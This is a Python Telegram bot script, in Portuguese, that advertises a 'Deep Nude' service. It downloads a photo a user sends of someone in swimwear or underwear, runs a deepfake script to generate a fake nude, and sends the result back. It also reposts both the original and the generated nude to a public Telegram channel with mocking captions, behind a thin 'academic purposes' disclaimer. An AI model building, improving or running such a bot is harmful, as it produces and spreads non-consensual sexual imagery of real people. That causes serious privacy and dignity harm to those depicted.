#!/usr/bin/env python
# -*- coding: utf-8 -*-
import telepot
import subprocess
import time

#api do bot
api = 'sua api do telegram'
bot = telepot.Bot(api)

# função handle
def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
#------------------------------DEEP NUDE DO TELEGRAM BOT -------------------------->>>>>
    if content_type == 'photo': # or msg.get('reply_to_message')
        bot.sendMessage(chat_id, '🤖 Estou baixando sua foto!')
        bot.download_file(msg['photo'][-1]['file_id'], './images/file.jpg')
        time.sleep(2)
        bot.sendMessage(chat_id, '🤖 Foto Salva!')
        time.sleep(2)
        bot.sendMessage(chat_id, '⚠️ Iniciando Processo ⚠️')
        time.sleep(2)
        bot.sendMessage(chat_id, '🤖 O Processo de Deep Nude pode levar até 5 minutos, não tem como parar este processo até que ele acabe!')
        time.sleep(2)
        bot.sendMessage(chat_id, '⚠️ Aguarde ⚠️')
        subprocess.call('python deepfake.py')
        bot.sendMessage(chat_id, '🤖 Processamento concluido com sucesso!')
        time.sleep(2)
        bot.sendMessage(chat_id, '🤖 Estou fazendo upload da imagem, minha net é lenta tenha paciencia, posso levar até 5 minutos dependendo do tamanho da imagem gerada!')
        bot.sendPhoto(chat_id, open('images/renderizada.jpg', 'rb'))
        bot.sendMessage(chat_id, '👮️ Espero que não faça merda com esta imagem, este bot é apenas para fins acadêmicos e não nos responsabilizamos pelo seu uso! 👮')
        print('[+] bot fez todo processo e enviou a imagem apos renderizada com sucesso [+]')
        canal = '@deepmanicomio'
        foto1 = open('images/file.jpg', 'rb')
        foto2 = open('images/renderizada.jpg', 'rb')
        bot.sendPhoto(chat_id=canal, photo= foto1, caption='🤖 MARCINHO: Um cara mandou estas fotos no meu pv.')
        bot.sendPhoto(chat_id=canal, photo= foto2, caption='🤖 MARCINHO: E eu fiz isto com ela, sou um robo irado!')
        print(f'Fotos enviadas para o canal: {canal}')

#========================================================================================================================================================================================================================
#-------------------------------------inicio das conversas e outras coisas------------------------------------------------------------------------------------------------------------------------------------------------------------>>>>
    if msg.get('text'):
        texto = msg['text']

        if 'a' in texto or 'e' in texto or 'i' in texto or 'o' in texto or 'u' in texto:  # or msg.get('reply_to_message')
            informacao = '''💬 Bem vindo! Sou um bot que cria Deep Nudes!
             
➿ Deep Nudes, são fakes de nudes que eu crio usando Deep Learning e Machine Learning, devido este processo ser longo e consumir muito processamento!!!
🤖 Agora quero que preste atenção:
⚠️ o processo todo pode levar ate 10 minutos!
⚠️ nem sempre estou online, afinal isto é muito pesado!
⚠️ irei avisando ao longo do processo ate entregar a imagem!
🤖 Como usar meus serviços:
⚠️ apenas faça um upload de uma imagem e espere!
⚠️ só reconheço imagens de biquini ou roupas intimas!
⚠️ preste atenção na imagem de exemplo!
⚠️ reconheço imagens somente como exemplo mostrado!
⚠️ fique a vontade para testar com imagens fora do contexto do exemplo...
==========================================
👮 Conteudo criado apenas para fins academicos, não nos responsabilizamos pelo que aqui é criado ou postado! 👮
=========================================='''
            bot.sendMessage(chat_id, informacao)
            bot.sendPhoto(chat_id, photo='AgACAgEAAx0CUYaz7wACD1FercAL08Vn3GhOV42nbp8wzShYGQAC9qgxG_w6cUUNS1byU1r4SZilEjAABAEAAwIAA3gAA5hTAAIZBA')

bot.message_loop(handle)
print ('[+] ON')
while 1:
        pass
